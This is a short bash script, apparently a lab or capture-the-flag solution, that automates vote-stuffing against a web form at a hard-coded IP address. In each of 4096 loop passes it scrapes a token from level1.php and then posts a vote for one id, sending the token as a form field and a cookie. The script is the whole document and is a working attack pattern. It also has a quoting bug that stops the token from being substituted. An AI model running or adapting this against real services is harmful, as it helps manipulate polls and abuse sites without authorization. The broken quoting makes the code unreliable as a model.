#!/bin/bash
for i in $(seq 1 4096); do
key=$(curl -X POST http://158.69.76.135/level1.php | grep -oE '\w{15,}')
curl -s -X POST http://158.69.76.135/level1.php -d 'id=2187&holdthedoor=submit&key=$key' -vvv -b 'HoldTheDoor=$key' | head
done
